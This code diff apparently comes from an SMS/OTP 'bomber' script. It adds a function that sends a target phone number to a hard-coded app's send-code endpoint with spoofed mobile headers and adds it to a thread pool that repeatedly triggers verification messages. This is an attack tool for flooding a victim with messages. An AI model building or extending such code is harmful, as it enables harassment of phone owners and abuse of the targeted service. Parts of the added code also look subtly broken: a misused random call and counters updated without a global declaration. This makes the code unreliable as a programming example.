@@ -4,6 +4,7 @@ import sys
 import os
 import base64
 import json
+import random
 from multiprocessing.pool import ThreadPool
 logo=(""" \033[1;92m____  _   _ _                     _
 |  _ \| | | | |__   ___  _ __ ___ | |__   ___ _ __
@@ -147,7 +148,22 @@ def otp3(number):
         return False
 
 def otp4(number):
-    pass
+    url = "http://8.212.181.240:80/index/user/send_code"
+    header = {'Device-Id': '3076685aef999{}'.format(str(random.choice(100, 999))),'App-Id': 'UYJEeAtD','Authorization': '','Content-Type': 'application/json; charset=UTF-8','Content-Length': '23','Host': '8.212.181.240','Connection': 'Keep-Alive','Accept-Encoding': 'gzip','User-Agent': 'okhttp/4.9.0'}
+    body = {"phone":str(number)}
+    try:
+        web = requests.post(url, headers = header, json = body)
+        r = json.loads(web.text)
+        if r["msg"] == "success":
+            limit+=1
+            return True
+        else:
+            field+=1
+            return False
+    except:
+        field+=1
+        return False
+        
 def bomber(function):
     global limit, RUN, limit1, field
     number = open("number.txt", "r").read()
@@ -173,7 +189,7 @@ def home():
     a.write(str(number))
     a.close()
     print("\033[1;92m║ \033[1;94m—> \033[1;92mLimit")
-    function = [otp, otp1, otp2, otp3]
+    function = [otp, otp1, otp2, otp3, otp4]
     limit1 = pick()
     p = ThreadPool(int(len(function)))
     p.map(bomber, function)
